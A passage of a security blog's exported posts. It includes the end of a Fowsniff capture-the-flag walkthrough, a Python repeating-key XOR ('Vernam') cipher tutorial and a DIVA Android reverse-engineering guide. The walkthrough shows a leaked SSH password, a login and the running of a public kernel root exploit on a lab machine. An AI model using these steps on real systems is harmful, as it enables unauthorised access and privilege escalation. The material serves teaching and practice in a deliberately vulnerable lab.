seina@fowsniffReceived: by fowsniff (Postfix, from userid 1000)    id 0FA3916A; Tue, 13 Mar 2018 14:51:07 -0400 (EDT)To: baksteen@fowsniff, mauer@fowsniff, mursten@fowsniff,    mustikka@fowsniff, parede@fowsniff, sciana@fowsniff, seina@fowsniff,    tegel@fowsniffSubject: URGENT! Security EVENT!Message-Id: &lt;20180313185107.0FA3916A@fowsniff&gt;Date: Tue, 13 Mar 2018 14:51:07 -0400 (EDT)From: stone@fowsniff (stone)Dear All,A few days ago, a malicious actor was able to gain entry toour internal email systems. The attacker was able to exploitincorrectly filtered escape characters within our SQL databaseto access our login credentials. Both the SQL and authenticationsystem used legacy methods that had not been updated in some time.We have been instructed to perform a complete internal systemoverhaul. While the main systems are &quot;in the shop,&quot; we havemoved to this isolated, temporary server that has minimalfunctionality.This server is capable of sending and receiving emails, but onlylocally. That means you can only send emails to other users, notto the world wide web. You can, however, access this system viathe SSH protocol.The temporary password for SSH is &quot;S1ck3nBluff+secureshell&quot;You MUST change this password as soon as possible, and you will do so under myguidance. I saw the leak the attacker posted online, and I must say that yourpasswords were not very secure.Come see me in my office at your earliest convenience and we&apos;ll set it up.Thanks,A.J Stone</code></pre><p>Okay… At this point I knew a temporary SSH password, but I didn’t know who changed their password it already. The second message came to my rescue and revealed the sloppy user.</p><pre><code>retr 2+OK 1280 octetsReturn-Path: &lt;baksteen@fowsniff&gt;X-Original-To: seina@fowsniffDelivered-To: seina@fowsniffReceived: by fowsniff (Postfix, from userid 1004)    id 101CA1AC2; Tue, 13 Mar 2018 14:54:05 -0400 (EDT)To: seina@fowsniffSubject: You missed out!Message-Id: &lt;20180313185405.101CA1AC2@fowsniff&gt;Date: Tue, 13 Mar 2018 14:54:05 -0400 (EDT)From: baksteen@fowsniffDevin,You should have seen the brass lay into AJ today!We are going to be talking about this one for a looooong time hahaha.Who knew the regional manager had been in the navy? She was swearing like a sailor!I don&apos;t know what kind of pneumonia or something you brought back withyou from your camping trip, but I think I&apos;m coming down with it myself.How long have you been gone - a week?Next time you&apos;re going to get sick and miss the managerial blowout of the century,at least keep it to yourself!I&apos;m going to head home early and eat some chicken soup.I think I just got an email from Stone, too, but it&apos;s probably just some&quot;Let me explain the tone of my meeting with management&quot; face-saving mail.I&apos;ll read it when I get back.Feel better,SkylerPS: Make sure you change your email password.AJ had been telling us to do that right before Captain Profanity showed up.</code></pre><p>This message came from <code>baksteen</code> and know I know, he didn’t have the time to change his SSH password.</p><h2 id="Getting-SSH-access"><a href="#Getting-SSH-access" class="headerlink" title="Getting SSH access"></a>Getting SSH access</h2><pre><code>root@kali:~# ssh baksteen@192.168.43.90baksteen@192.168.43.90&apos;s password:                            _____                       _  __  __        :sdddddddddddddddy+  |  ___|____      _____ _ __ (_)/ _|/ _|     :yNMMMMMMMMMMMMMNmhsso  | |_ / _ \ \ /\ / / __| &apos;_ \| | |_| |_   .sdmmmmmNmmmmmmmNdyssssso  |  _| (_) \ V  V /\__ \ | | | |  _|  _|  -:      y.      dssssssso  |_|  \___/ \_/\_/ |___/_| |_|_|_| |_|   -:      y.      dssssssso                ____                      -:      y.      dssssssso               / ___|___  _ __ _ __        -:      y.      dssssssso              | |   / _ \| &apos;__| &apos;_ \     -:      o.      dssssssso              | |__| (_) | |  | |_) |  _  -:      o.      yssssssso               \____\___/|_|  | .__/  (_)-:    .+mdddddddmyyyyyhy:                              |_|        -: -odMMMMMMMMMMmhhdy/.    .ohdddddddddddddho:                  Delivering Solutions   ****  Welcome to the Fowsniff Corporate Server! ****              ---------- NOTICE: ---------- * Due to the recent security breach, we are running on a very minimal system. * Contact AJ Stone -IMMEDIATELY- about changing your email and SSH passwords.baksteen@fowsniff:~$</code></pre><p>I quickly looked around, but I didn’t find anything useful.</p><h2 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h2><p>As for enumeration, my favorite bash script is LinEnum. You can download it from here: <a href="https://github.com/rebootuser/LinEnum" target="_blank" rel="noopener">https://github.com/rebootuser/LinEnum</a><br>The output of this script is pretty long, so I just show the important parts.</p><pre><code>baksteen@fowsniff:/tmp$ wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh--2018-12-09 08:20:53--  https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.shResolving raw.githubusercontent.com (raw.githubusercontent.com)... 151.101.112.133, 64:ff9b::9765:7085Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|151.101.112.133|:443... connected.HTTP request sent, awaiting response... 200 OKLength: 47585 (46K) [text/plain]Saving to: â€˜LinEnum.shâ€™LinEnum.sh                100%[===================================&gt;]  46.47K  --.-KB/s    in 0.08s   2018-12-09 08:20:53 (605 KB/s) - &quot;LinEnum.sh&quot; saved [47585/47585]baksteen@fowsniff:/tmp$ chmod +x LinEnum.shbaksteen@fowsniff:/tmp$ ./LinEnum.sh########################################################## Local Linux Enumeration &amp; Privilege Escalation Script ########################################################### www.rebootuser.com# version 0.93### SYSTEM ##############################################[-] Kernel information:Linux fowsniff 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux[-] Kernel information (continued):Linux version 4.4.0-116-generic (buildd@lgw01-amd64-021) (gcc version 5.4.0 20160609  (Ubuntu 5.4.0-6ubuntu1~16.04.9) ) #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018[-] Specific release information:DISTRIB_ID=UbuntuDISTRIB_RELEASE=16.04DISTRIB_CODENAME=xenialDISTRIB_DESCRIPTION=&quot;Ubuntu 16.04.4 LTS&quot;NAME=&quot;Ubuntu&quot;VERSION=&quot;16.04.4 LTS (Xenial Xerus)&quot;ID=ubuntuID_LIKE=debianPRETTY_NAME=&quot;Ubuntu 16.04.4 LTS&quot;VERSION_ID=&quot;16.04&quot;HOME_URL=&quot;http://www.ubuntu.com/&quot;SUPPORT_URL=&quot;http://help.ubuntu.com/&quot;BUG_REPORT_URL=&quot;http://bugs.launchpad.net/ubuntu/&quot;VERSION_CODENAME=xenialUBUNTU_CODENAME=xenial</code></pre><div class="addthis_tipjar_inline"></div><h2 id="Getting-root-access"><a href="#Getting-root-access" class="headerlink" title="Getting root access"></a>Getting root access</h2><p>I didn’t find anything unusual that’s why I went on to check the kernel version and search for some exploits. It didn’t take long to find the correct exploit.<br>Link: <a href="https://www.exploit-db.com/exploits/44298" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/44298</a><br>The target machine didn’t have gcc installed, so I compiled the source code on my Kali machine and then transferred the binary to the target machine’s <code>tmp</code> folder.</p><pre><code>root@kali:~/Downloads# gcc exploit.c -o exploitroot@kali:~/Downloads# scp exploit baksteen@192.168.43.90:/tmpbaksteen@192.168.43.90&apos;s password:exploit</code></pre><p>On the target machine, I executed the exploit…</p><pre><code>baksteen@fowsniff:/tmp$ ./exploittask_struct = ffff88001c045400uidptr = ffff88001f266d84spawning root shellroot@fowsniff:/tmp# iduid=0(root) gid=0(root) groups=0(root),100(users),1001(baksteen)</code></pre><p>and I got a root shell. Yaay!</p><p>The only thing left is printing the flag:</p><pre><code>    ___                        _        _      _   _             _  / __|___ _ _  __ _ _ _ __ _| |_ _  _| |__ _| |_(_)___ _ _  __| | | (__/ _ \ &apos; \/ _` | &apos;_/ _` |  _| || | / _` |  _| / _ \ &apos; \(_-&lt;_|  \___\___/_||_\__, |_| \__,_|\__|\_,_|_\__,_|\__|_\___/_||_/__(_)               |___/ (_)  |--------------  |&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;|  |    R O O T   |  |    F L A G   |  |&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;|  |--------------  |  |  |  |  |  | ---Nice work!This CTF was built with love in every byte by @berzerk0 on Twitter.Special thanks to psf, @nbulischeck and the whole Fofao Team.</code></pre><h2 id="Before-you-go"><a href="#Before-you-go" class="headerlink" title="Before you go"></a>Before you go</h2><p>If you found this article helpful, please share to help others with similar interest find it! + Feedback and donations are always welcome!</p><p><br><div align="center" class="addthis_inline_share_toolbox"></div><br></p>]]></content>
      
      
      <categories>
          
          <category> CTF Walkthroughs </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vulnhub </tag>
            
            <tag> ctf </tag>
            
            <tag> walkthrough </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>The Vernam Cipher</title>
      <link href="/2018/11/28/The-Vernam-Cipher/"/>
      <url>/2018/11/28/The-Vernam-Cipher/</url>
      
        <content type="html"><![CDATA[<script type="text/javascript" src="//s7.addthis.com/js/300/addthis_widget.js#pubid=ra-5bf72b3154516f79"></script><p><img src="the_vernam_cipher.png" alt></p><blockquote><p>The Vernam Cipher is based on the principle that each plaintext character from a message is ‘mixed’ with one character from a key stream. If a truly random key stream is used, the result will be a truly ‘random’ ciphertext which bears no relation to the original plaintext.</p></blockquote><center>- - - - - - - - - -</center><h2 id="How-does-it-work"><a href="#How-does-it-work" class="headerlink" title="How does it work?"></a>How does it work?</h2><p>Let’s say we have a word “secret” and we want to encrypt with the key “key”. The length of the key (3) is obviously shorter than the length of the message (6). In this case, we repeat the key until it reaches the length of the plain message. The encryption key will be “keykey”.</p><p>Next, we have to convert both the plain text and the key to binary.</p><p><strong>Plain text message in binary:</strong></p><center><em>011100110110010101100011011100100110010101110100</em></center><p><strong>The key in binary:</strong></p><center><em>011010110110010101111001011010110110010101111001</em></center><p>Finally, we have to XOR these two binary values to get the encrypted message.</p><blockquote><p>0 ⊕ 0 = 0</p><p>0 ⊕ 1 = 1</p><p>1 ⊕ 0 = 1</p><p>1 ⊕ 1 = 0</p></blockquote><p><strong>Encrypted message:</strong></p><center><em>000110000000000000011010000110010000000000001101</em></center><p><br><center>- - - - - - - - - -</center></p><h2 id="Encryption"><a href="#Encryption" class="headerlink" title="Encryption"></a>Encryption</h2><p>Th encrypt method takes 2 parameter a key and a message, which are required for the encryption. I initialized an index variable with a value of 0. It’s used for keeping track of the key length. The loop goes through the message character by character. In the loop, I calculate the ascii code for the current character both in the message and key and do a XOR operation on those values. I convert this back to a single char (might be a gibberish value) and append it to the <code>encrypted_message</code> variable. After this, the index needs to be incremented. If the index is equals with length of the key, then I set the index back to 0 to prevent possible index out of range exceptions.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(key, message)</span>:</span></span><br><span class="line">    encrypted_message = <span class="string">""</span></span><br><span class="line"></span><br><span class="line">    index = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> message:</span><br><span class="line">        encrypted_message = encrypted_message + chr(ord(char) ^ ord(key[index]))</span><br><span class="line">        index = index + <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> index == len(key):</span><br><span class="line">            index = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> bin(int(binascii.hexlify(encrypted_message), <span class="number">16</span>))</span><br></pre></td></tr></table></figure><h2 id="Decryption"><a href="#Decryption" class="headerlink" title="Decryption"></a>Decryption</h2><p>As for the decryption, the procedure is almost exactly the same. The only thing that differs from the encryption is that I converted the encrypted message to binary, which is required for binary operations.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(key, message)</span>:</span></span><br><span class="line">    message = binascii.unhexlify(<span class="string">"%x"</span> % int(message, <span class="number">2</span>))</span><br><span class="line"></span><br><span class="line">    decrypted_message = <span class="string">''</span></span><br><span class="line"></span><br><span class="line">    index = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> message:</span><br><span class="line">        decrypted_message = decrypted_message + chr(ord(char) ^ ord(key[index]))</span><br><span class="line">        index = index + <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> index == len(key):</span><br><span class="line">            index = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> decrypted_message</span><br></pre></td></tr></table></figure><div class="addthis_tipjar_inline"></div><p><br><center>- - - - - - - - - -</center></p><h2 id="The-full-source-code"><a href="#The-full-source-code" class="headerlink" title="The full source code"></a>The full source code</h2><p>I created a command line program to make the code more usable. Actually, I just added some command line arguments. Anyway, I hope you like it!</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(key, message)</span>:</span></span><br><span class="line">    encrypted_message = <span class="string">""</span></span><br><span class="line"></span><br><span class="line">    index = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> message:</span><br><span class="line">        encrypted_message = encrypted_message + chr(ord(char) ^ ord(key[index]))</span><br><span class="line">        index = index + <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> index == len(key):</span><br><span class="line">            index = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> bin(int(binascii.hexlify(encrypted_message), <span class="number">16</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(key, message)</span>:</span></span><br><span class="line">    message = binascii.unhexlify(<span class="string">"%x"</span> % int(message, <span class="number">2</span>))</span><br><span class="line"></span><br><span class="line">    decrypted_message = <span class="string">''</span></span><br><span class="line"></span><br><span class="line">    index = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> message:</span><br><span class="line">        decrypted_message = decrypted_message + chr(ord(char) ^ ord(key[index]))</span><br><span class="line">        index = index + <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> index == len(key):</span><br><span class="line">            index = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> decrypted_message</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    usage = <span class="string">"python vernam_cipher.py -e -m secret -k key\nor\n \ "</span> \</span><br><span class="line">            <span class="string">"python vernam_cipher.py -d -m 0b110000000000000011010000110010000000000001101 -k key"</span></span><br><span class="line">    description = <span class="string">"Command line program for demonstrating the Vernam cipher."</span></span><br><span class="line">    parser = argparse.ArgumentParser(usage=usage, description=description)</span><br><span class="line"></span><br><span class="line">    parser.add_argument(<span class="string">"-v"</span>, <span class="string">"--version"</span>, action=<span class="string">"version"</span>, version=<span class="string">"%(prog)s 1.0"</span>)</span><br><span class="line"></span><br><span class="line">    group = parser.add_mutually_exclusive_group(required=<span class="literal">True</span>)</span><br><span class="line">    group.add_argument(<span class="string">"-e"</span>, <span class="string">"--encrypt"</span>, action=<span class="string">"store_true"</span>, dest=<span class="string">"encrypt"</span>,</span><br><span class="line">                       help=<span class="string">"Encrypts the plain text message."</span>)</span><br><span class="line">    group.add_argument(<span class="string">"-d"</span>, <span class="string">"--decrypt"</span>, action=<span class="string">"store_true"</span>, dest=<span class="string">"decrypt"</span>,</span><br><span class="line">                       help=<span class="string">"Decrypts the encrypted message."</span>)</span><br><span class="line"></span><br><span class="line">    parser.add_argument(<span class="string">"-m"</span>, <span class="string">"--message"</span>, action=<span class="string">"store"</span>, required=<span class="literal">True</span>, dest=<span class="string">"message"</span>,</span><br><span class="line">                        help=<span class="string">"You need to specify the message. Like this: -m \"secret\""</span>)</span><br><span class="line"></span><br><span class="line">    parser.add_argument(<span class="string">"-k"</span>, <span class="string">"--key"</span>, action=<span class="string">"store"</span>, required=<span class="literal">True</span>, dest=<span class="string">"key"</span>,</span><br><span class="line">                        help=<span class="string">"You need to specify the key."</span>)</span><br><span class="line"></span><br><span class="line">    options = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> options.encrypt:</span><br><span class="line">        print(<span class="string">"The encrypted message is: "</span> + encrypt(options.key, options.message))</span><br><span class="line">    <span class="keyword">elif</span> options.decrypt:</span><br><span class="line">        print(<span class="string">"The decrypted message is: "</span> + decrypt(options.key, options.message))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>Feel free to download and experiment with the code, it’s the best way to learn new things!</p><center>- - - - - - - - - -</center><h2 id="Before-you-go"><a href="#Before-you-go" class="headerlink" title="Before you go"></a>Before you go</h2><p>If you found this article helpful, please share to help others with similar interest find it! + Feedback and donations are always welcome!</p><p><br><div align="center" class="addthis_inline_share_toolbox"></div><br></p>]]></content>
      
      
      <categories>
          
          <category> Cryptography </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cryptography </tag>
            
            <tag> cipher </tag>
            
            <tag> vernam </tag>
            
            <tag> encryption </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Reverse Engineering The DIVA Apk</title>
      <link href="/2018/11/24/Reverse-Engineering-The-DIVA-Apk/"/>
      <url>/2018/11/24/Reverse-Engineering-The-DIVA-Apk/</url>
      
        <content type="html"><![CDATA[<script type="text/javascript" src="//s7.addthis.com/js/300/addthis_widget.js#pubid=ra-5bf72b3154516f79"></script><p><img src="reverse_engineering_the_diva_apk.png" alt></p><h1 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h1><blockquote><p>DIVA stands for Damn Insecure and Vulnerable Application. This Android application is intentionally vulnerable and created just for testing purposes. You can download the application from here: <a href="http://www.payatu.com/wp-content/uploads/2016/01/diva-beta.tar.gz" target="_blank" rel="noopener">http://www.payatu.com/wp-content/uploads/2016/01/diva-beta.tar.gz</a></p></blockquote><h2 id="Required-tools"><a href="#Required-tools" class="headerlink" title="Required tools"></a>Required tools</h2><p>There are some really good tools out there, but I’m going show you my favorite ones.</p><ul><li><h3 id="Apktool"><a href="#Apktool" class="headerlink" title="Apktool"></a><a href="https://ibotpeaches.github.io/Apktool/install/" target="_blank" rel="noopener">Apktool</a></h3></li></ul><p>It’s is used for reverse engineering 3rd party, closed, binary Android apps. You can edit the decompiled .smali code and re-buid the app with you modifications. Even though, it’s not really required to follow along, you should totally check it out!</p><ul><li><h3 id="Dex2Jar"><a href="#Dex2Jar" class="headerlink" title="Dex2Jar"></a><a href="https://github.com/pxb1988/dex2jar" target="_blank" rel="noopener">Dex2Jar</a></h3></li></ul><p>We are going to work with .dex files and it’s the best tool to convert those file to a single JAR, which can be decompiled later on.</p><ul><li><h3 id="JD-CMD"><a href="#JD-CMD" class="headerlink" title="JD-CMD"></a><a href="https://github.com/kwart/jd-cmd" target="_blank" rel="noopener">JD-CMD</a></h3></li></ul><p>My personal favorite java command-line decompiler is <em>jd-cmd</em>. It’s easy to use and has some very handy command line options.</p><ul><li><h3 id="JD-GUI"><a href="#JD-GUI" class="headerlink" title="JD-GUI"></a><a href="http://jd.benow.ca/" target="_blank" rel="noopener">JD-GUI</a></h3></li></ul><p>If you like GUI (Graphical User Interface), then you should download <em>JD-GUI</em>.</p><center>- - - - - - - - - -</center><center><em>Note: I’m using Linux, but the tools should work on every platform!</em></center><center>- - - - - - - - - -</center><h2 id="Decompressing-APK-files"><a href="#Decompressing-APK-files" class="headerlink" title="Decompressing APK files"></a>Decompressing APK files</h2><p>APK stands for Android Package Kit. APK files are saved in a compressed .zip format and can be opened by any zip decompression tool. You can try it by renaming the .apk extension to .zip and decompressing the file. The content will be something like this:</p><pre><code>┌─[t0thkr1s@btksoftware]─[~/Downloads]└──╼ $ mv diva-beta.apk diva-beta.zip┌─[t0thkr1s@btksoftware]─[~/Downloads]└──╼ $ unzip diva-beta.zip -d diva-betaArchive:  diva-beta.zip  inflating: AndroidManifest.xml       inflating: res/anim/abc_fade_in.xml    inflating: res/anim/abc_fade_out.xml--- snip ---┌─[t0thkr1s@btksoftware]─[~/Downloads]└──╼ $ cd diva-beta/┌─[t0thkr1s@btksoftware]─[~/Downloads/diva-beta]└──╼ $ lsAndroidManifest.xml  classes.dex  lib  META-INF  res  resources.arsc</code></pre><p>The downside of this technique is that the .xml files are barely readable. You can find some activity names and permissions, but the file is mostly gibberish.</p><h2 id="Apktool-to-the-rescue"><a href="#Apktool-to-the-rescue" class="headerlink" title="Apktool to the rescue"></a>Apktool to the rescue</h2><pre><code>┌─[t0thkr1s@btksoftware]─[~/Downloads]└──╼ $ apktool d diva-beta.apk -o diva-betaI: Using Apktool 2.3.1-dirty on diva-beta.apkI: Loading resource table...I: Decoding AndroidManifest.xml with resources...I: Loading resource table from file: /home/t0thkr1s/.local/share/apktool/framework/1.apkI: Regular manifest package...I: Decoding file-resources...I: Decoding values */* XMLs...I: Baksmaling classes.dex...I: Copying assets and libs...I: Copying unknown files...I: Copying original files...┌─[t0thkr1s@btksoftware]─[~/Downloads]└──╼ $ cd diva-beta┌─[t0thkr1s@btksoftware]─[~/Downloads/diva-beta]└──╼ $ lsAndroidManifest.xml  apktool.yml  lib  original  res  smali</code></pre><p>Apktool produces different files. This time, if you try to read the AndroidManifest.xml file, for example, you’ll get a fully readable and formatted .xml file. But, where are the source files? Apktool generates .smali files, which you can edit and then recompile the application.</p><div class="addthis_tipjar_inline"></div><h2 id="Source-files"><a href="#Source-files" class="headerlink" title="Source files"></a>Source files</h2><p>Let’s not concentrate on the XML files, we want the source code. Now, in order to read the classes.dex file, we can use an excellent tool called dex2jar. Head over to <a href="https://github.com/pxb1988/dex2jar/releases" target="_blank" rel="noopener">https://github.com/pxb1988/dex2jar/releases</a> and download the latest stable release. I added the contents of the zipped file to my PATH recursively, this way the usage in different directories is much easier.</p><pre><code>┌─[t0thkr1s@btksoftware]─[~/Downloads/diva-beta]└──╼ $ d2j-dex2jar.sh classes.dexdex2jar classes.dex -&gt; ./classes-dex2jar.jar┌─[t0thkr1s@btksoftware]─[~/Downloads/diva-beta]└──╼ $ ls | grep *.jarclasses-dex2jar.jar</code></pre><p>At this point, you have 2 options. If you like working in the command-line, then use jd-cmd, if you prefer GUI then you have JD-GUI. In this example, I’m going to use jd-cmd and show you its usage. In case you chose JD-GUI, all you have to do is open the .jar file and you’ll be presented with the decompiled .java source files. As for jd-cmd, here is how you do it:</p><pre><code>┌─[t0thkr1s@btksoftware]─[~/Downloads/diva-beta]└──╼ $ sudo java -jar ~/Downloads/jd-cli.jar classes-dex2jar.jar -od src[sudo] password for t0thkr1s:12:35:42.417 INFO  jd.cli.Main - Decompiling classes-dex2jar.jar12:35:42.420 INFO  jd.core.output.DirOutput - Directory output will be initialized for path src-- snip --12:35:46.245 INFO  jd.core.output.DirOutput - Finished with 1788 class file(s) and 0 resource file(s) written.┌─[t0thkr1s@btksoftware]─[~/Downloads/diva-beta/src/jakhar/aseem/diva]└──╼ $ ls AccessControl1Activity.java             &apos;NotesProvider$DBHelper.java&apos; AccessControl2Activity.java              NotesProvider.java AccessControl3Activity.java             &apos;R$anim.java&apos; AccessControl3NotesActivity.java        &apos;R$attr.java&apos; APICreds2Activity.java                  &apos;R$bool.java&apos; APICredsActivity.java                   &apos;R$color.java&apos; BuildConfig.java                        &apos;R$dimen.java&apos; DivaJni.java                            &apos;R$drawable.java&apos; Hardcode2Activity.java                  &apos;R$id.java&apos; HardcodeActivity.java                   &apos;R$integer.java&apos; InputValidation2URISchemeActivity.java   R.java InputValidation3Activity.java           &apos;R$layout.java&apos; InsecureDataStorage1Activity.java       &apos;R$menu.java&apos; InsecureDataStorage2Activity.java       &apos;R$mipmap.java&apos; InsecureDataStorage3Activity.java       &apos;R$string.java&apos; InsecureDataStorage4Activity.java       &apos;R$styleable.java&apos; LogActivity.java                        &apos;R$style.java&apos; MainActivity.java                        SQLInjectionActivity.java</code></pre><p>jd-cli.jar provides multiple command-line options. Here, I used <em>-od </em>to specify the output directory as <em>src</em>.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> jakhar.aseem.diva;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.support.v7.app.AppCompatActivity;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.widget.EditText;</span><br><span class="line"><span class="keyword">import</span> android.widget.Toast;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HardcodeActivity</span></span></span><br><span class="line"><span class="class">  <span class="keyword">extends</span> <span class="title">AppCompatActivity</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">access</span><span class="params">(View paramView)</span></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (((EditText)findViewById(<span class="number">2131492987</span>)).getText().toString().equals(<span class="string">"vendorsecretkey"</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      Toast.makeText(<span class="keyword">this</span>, <span class="string">"Access granted! See you on the other side :)"</span>, <span class="number">0</span>).show();</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    Toast.makeText(<span class="keyword">this</span>, <span class="string">"Access denied! See you in hell :D"</span>, <span class="number">0</span>).show();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle paramBundle)</span></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="keyword">super</span>.onCreate(paramBundle);</span><br><span class="line">    setContentView(<span class="number">2130968607</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>I assume you can easily spot the hardcoded vendor secret key check. This is a very bad coding practice to hardcode secrets in source files. DIVA was created to present numerous vulnerabilities and bad practices. Check out the other activities to see them!</p><p>I wrote a small shell script to automate these steps and properly reverse engineer Android applications. I may reveal it in my next post 😉</p><h2 id="Before-you-go"><a href="#Before-you-go" class="headerlink" title="Before you go"></a>Before you go</h2><p>If you found this article helpful, please share to help others with similar interest find it! + Feedback and donations are always welcome!</p><p><br><div align="center" class="addthis_inline_share_toolbox"></div><br></p>]]></content>
      
      
      <categories>
          
          <category> Android Security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> security </tag>
            
            <tag> reverse engineering </tag>
            
            <tag> android </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Toppo Walkthrough</title>
      <link href="/2018/11/17/Toppo-Walkthrough/"/>
      <url>/2018/11/17/Toppo-Walkthrough/</url>
      
